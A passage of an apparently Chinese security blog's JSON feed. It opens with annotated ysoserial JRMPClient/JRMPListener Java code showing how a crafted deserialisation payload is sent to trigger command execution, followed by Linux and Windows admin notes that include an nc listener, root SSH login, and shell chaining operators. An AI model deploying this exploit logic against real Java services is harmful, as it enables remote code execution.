punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// 以下信息都是连接 JRMPListener 通信所需信息</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">ObjID</span> id <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// RMI registry</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">TCPEndpoint</span> te <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TCPEndpoint</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">UnicastRef</span> ref <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UnicastRef</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LiveRef</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> te<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">RemoteObjectInvocationHandler</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RemoteObjectInvocationHandler</span><span class=\"token punctuation\">(</span>ref<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这就是构造的 payload，创建了一个 Registry 类型的代理对象，handler 值为上面创建的 RemoteObjectInvocationHandler</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">Registry</span> proxy <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Registry</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JRMPClient</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token class-name\">Registry</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> proxy<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong> <code>exploit/JRMPListener</code> </strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doCall</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DataInputStream</span> in<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DataOutputStream</span> out<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> payload<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">ObjID</span> read<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token comment\">// 这里读取到的是 JRMPClient 端发送的 DgcID</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            read <span class=\"token operator\">=</span> <span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>ois<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unable to read objID\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 这里如果判断是否为 Dgc 调用，DgcID 为 [0:0:0, 2]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            ois<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// method</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            ois<span class=\"token punctuation\">.</span><span class=\"token function\">readLong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hash</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Is DGC call for \"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sending return with payload for obj \"</span> <span class=\"token operator\">+</span> read<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这里发送 81，也是为了防止 JRMPClient 抛出 transport return code invalid 异常</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Return</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// transport op</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JRMPClient<span class=\"token punctuation\">.</span>MarshalOutputStream</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>classpathUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">// 这里发送 2，就会进入分析 JRMPClient 时的第九步中第一种情况的 case2 中</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>ExceptionalReturn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">UID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>oos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\">// 这里生成了一个异常类，其中包含一个 Object 类型的属性，名为 val</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">BadAttributeValueExpException</span> ex <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BadAttributeValueExpException</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">// 这里将恶意 payload 赋值给了 val 属性，在反序列化 BadAttributeValueExpException 类时，val 值也会被反序列化，从而触发命令执行</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">,</span> <span class=\"token string\">\"val\"</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\">// 将 payload 发往 JRMPClient 端，payload 会被反序列化</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>hadConnection <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>waitLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>waitLock<span class=\"token punctuation\">.</span><span class=\"token function\">notifyAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": [
                "Web",
                "Java"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Windows/",
            "url": "http://yoursite.com/Web/Windows/",
            "title": "Windos必需知识",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"wsl\"><a class=\"anchor\" href=\"#wsl\">#</a> WSL</h1>\n<p>Windows Subsystem for Linux，在 Windows 用 kali 命令</p>\n<ol>\n<li>\n<p>控制面板 -&gt; 程序和功能 -&gt; 启用或关闭 Windows 功能 -&gt; 勾选 “<strong>适用于 Linux 的 Windows 子系统</strong>”</p>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240128214254879.png&quot; alt=&quot;image-20240128214254879&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128214634914.png\" alt=\"image-20240128214634914\" /></p>\n<p><strong>检查 Windows 版本</strong>：WSL 2 仅在 Windows 11 或 Windows 10 版本 1903、内部版本 18362 或更高版本中可用。通过按 Windows 徽标键 + R，检查你的 Windows 版本，然后键入 <strong>winver</strong>，选择 “确定”。 （或者在 Windows 命令提示符下输入  <code>ver</code>  命令）。</p>\n</li>\n<li>\n<p>微软商店安装 kali Linux<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHBzLm1pY3Jvc29mdC5jb20vZGV0YWlsLzlQS1IzNFROQ1YwNz9obD1lbi11cyZhbXA7Z2w9VVM=\">Kali Linux - Microsoft Apps</span></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128215359242.png\" alt=\"image-20240128215359242\" /></p>\n</li>\n</ol>\n<h1 id=\"端口占用\"><a class=\"anchor\" href=\"#端口占用\">#</a> 端口占用</h1>\n<ol>\n<li>netstat -ano | findstr 8080</li>\n<li>taskkill /F /pid  <code>pid值</code></li>\n</ol>\n<h1 id=\"删word空白页\"><a class=\"anchor\" href=\"#删word空白页\">#</a> 删 word 空白页</h1>\n<p>使用快捷键【Ctrl+Shift+8】，然后定位光标，按【delete】键删除就 OK 了。</p>\n",
            "tags": [
                "Web",
                "Windows"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E4%BA%91%E5%AE%89%E5%85%A8/",
            "url": "http://yoursite.com/Web/%E4%BA%91%E5%AE%89%E5%85%A8/",
            "title": "云安全",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnRlYW1zc2l4LmNvbS9DbG91ZFNlcnZpY2Uv\">https://wiki.teamssix.com/CloudService/</span></p>\n",
            "tags": [
                "Web",
                "Cloud"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Linux/",
            "url": "http://yoursite.com/Web/Linux/",
            "title": "Linux常用命令",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"yum\"><a class=\"anchor\" href=\"#yum\">#</a> yum</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># yum 包更新到最新，当安装过程提示选择全部为 \"yes\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token parameter variable\">-y</span> update</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 安装需要的软件包 (yum-utils 提供 yum-config-manager 的功能，，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> yum-utils device-mapper-persistent-data lvm2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 换源</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</pre></td></tr></table></figure><h1 id=\"screen\"><a class=\"anchor\" href=\"#screen\">#</a> screen</h1>\n<p>SSH 客户端断开后保持进程继续运行</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># CentOS</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token function\">screen</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Debian/Ubuntu</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">screen</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-S</span> test<span class=\"token punctuation\">(</span>作业名称<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-ls</span>  <span class=\"token comment\">#列出当前所有的作业</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-x</span> 作业序号或者名称  <span class=\"token comment\">#进入未离线（Attached）作业</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-r</span> 作业序号或者名称  <span class=\"token comment\"># 进入已离线（Detached）作业</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-d</span> 作业名称  <span class=\"token comment\">#远程结束某个作业</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>设置缓存：输入 Crtl + a + <span class=\"token builtin class-name\">:</span> 再输入 scrollback <span class=\"token number\">1234</span>，代表设置窗口缓存为1234行。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>查看历史信息：Ctrl + a + Esc，进入 “copy mode” ，然后就可以查看历史信息，甚至可以使用vim命令。按 esc 退出。</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Crtl-a  +d     保存进程并退出作业<span class=\"token punctuation\">(</span>程序在screen中继续运行，screen <span class=\"token parameter variable\">-ls</span> 可查看<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Crtl-a + k 或exit    退出作业和进程<span class=\"token punctuation\">(</span>程序终止，screen <span class=\"token parameter variable\">-ls</span> 不可查看<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token parameter variable\">-4</span>             仅将主机名解析到IPv4地址</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token parameter variable\">-6</span>             仅将主机名解析到IPv6地址</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token parameter variable\">-A</span> 　          将所有的视窗适应当前终端屏幕的大小</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token parameter variable\">-d</span>  　         将指定的screen作业离线</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token parameter variable\">-h</span> lines 　    指定视窗的缓冲区行数</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token parameter variable\">-m</span>             即使目前已在作业中的screen作业，仍强制建立新的screen作业</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token parameter variable\">-r</span>             恢复<span class=\"token punctuation\">(</span>Reattach<span class=\"token punctuation\">)</span>离线<span class=\"token punctuation\">(</span>detach<span class=\"token punctuation\">)</span>的screen作业</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token parameter variable\">-R</span> 　          先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token parameter variable\">-s</span> shell　     建立新视窗时<span class=\"token punctuation\">(</span>使用shell，而不是<span class=\"token environment constant\">$SHELL</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token parameter variable\">-S</span>             创建并指定screen作业的名称</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token parameter variable\">-U</span>             指定screen使用UTF-8编码</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token parameter variable\">-v</span> 　          显示版本信息</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token parameter variable\">-x</span> 　          进入<span class=\"token punctuation\">(</span>Attach<span class=\"token punctuation\">)</span>之前离线的screen作业</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>-ls或-list 　  显示目前所有的screen作业</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token parameter variable\">-wipe</span> 　       检查目前所有的screen作业，并删除已经无法使用的screen作业</pre></td></tr></table></figure><h1 id=\"ssh\"><a class=\"anchor\" href=\"#ssh\">#</a> ssh</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDg4MjU0NDk=\">https://zhuanlan.zhihu.com/p/148825449</span></p>\n<ol>\n<li>\n<p>基本连接：A【本地请求】——&gt;B【远程接收】</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>本地端口转发【内网】：A:X——&gt;B——&gt;C:Z</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-L</span> 主机A的端口X:主机C:主机C的端口Z username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>远程端口转发</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-R</span> 主机B的端口Y:主机C:主机C的端口Z username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>动态端口转发</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-D</span> 主机A的端口X username@hostname</pre></td></tr></table></figure></li>\n</ol>\n<p><strong>安装开启 ssh 服务</strong></p>\n<pre><code>apt-get update\napt-get install ssh\nservice ssh start\nservice postgresql start\nvi /etc/ssh/sshd_config\n将PermitRootLogin改为yes 使它能够使用密码进行登录\n保存退出，重启\n/etc/init.d/ssh restart\n</code></pre>\n<h1 id=\"端口占用\"><a class=\"anchor\" href=\"#端口占用\">#</a> 端口占用</h1>\n<ol>\n<li><code>netstat -tanlp</code></li>\n<li><code>Kill xxxx</code></li>\n</ol>\n<h1 id=\"docker\"><a class=\"anchor\" href=\"#docker\">#</a> docker</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 安装 docker</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> docker-ce <span class=\"token parameter variable\">-y</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 安装后查看 docker 版本</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">-v</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 启动 docker</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>systemctl start <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 停止 docker</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>systemctl stop <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 重启 docker</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 查看 docker 状态</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>systemctl status <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 开机启动</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>systemctl <span class=\"token builtin class-name\">enable</span> <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>systemctl unenable <span class=\"token function\">docker</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 查看 docker 概要信息</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">docker</span> info </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 查看 docker 帮助文档</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">--help</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 阿里云镜像加速</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> /etc/docker</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/docker/daemon.json <span class=\"token operator\">&lt;&lt;-</span><span class=\"token string\">'EOF'</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  \"registry-mirrors\": [\"https://73z5h6yb.mirror.aliyuncs.com\"]</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>EOF</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token function\">sudo</span> systemctl daemon-reload</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># 停止容器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">docker</span> stop ID</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 删除容器</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">rm</span> ID</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 删除镜像</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">docker</span> rmi ID</pre></td></tr></table></figure><h1 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h1>\n<p>监听端口服务，传输文件，反监听</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nc <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span> <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>监听本地 nc <span class=\"token operator\">-</span>lvp <span class=\"token number\">6666</span></pre></td></tr></table></figure><h1 id=\"拼接符\"><a class=\"anchor\" href=\"#拼接符\">#</a> 拼接符</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&amp;</span>是不管前后命令是否执行成功都会执行前后命令</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&amp;&amp;</span>是前面的命令执行成功才能执行后面的命令</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">||</span>是前面的命令执行不成功才能执行后面的命令</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">|</span>管道符</pre></td></tr></table></figure><h1 id=\"etchosts\"><a class=\"anchor\" href=\"#etchosts\">#</a> /etc/hosts</h1>\n<p>修改主机文件，IP 地址与域名快速解析</p>\n<h1 id=\"wget\"><a class=\"anchor\" href=\"#wget\">#</a> 